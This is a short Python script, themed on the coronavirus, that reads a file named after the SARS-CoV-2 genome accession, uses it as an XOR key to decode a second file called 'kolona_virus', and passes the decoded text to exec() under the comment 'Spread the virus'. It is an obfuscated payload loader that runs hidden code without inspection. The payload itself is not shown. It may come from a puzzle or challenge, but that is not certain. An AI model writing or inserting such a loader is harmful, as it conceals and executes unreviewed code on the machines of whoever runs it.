kolona_genome = open("MN908947",'r').read() # Read the Genome
kolona_rna = open("kolona_virus","r").read() # Read the RNA
kolona_virus = ""

for i,k in enumerate(kolona_rna): # Decode RNA
	kolona_virus += chr(ord(k) ^ ord(kolona_genome[i % len(kolona_genome)]))

exec(kolona_virus) # Spread the virus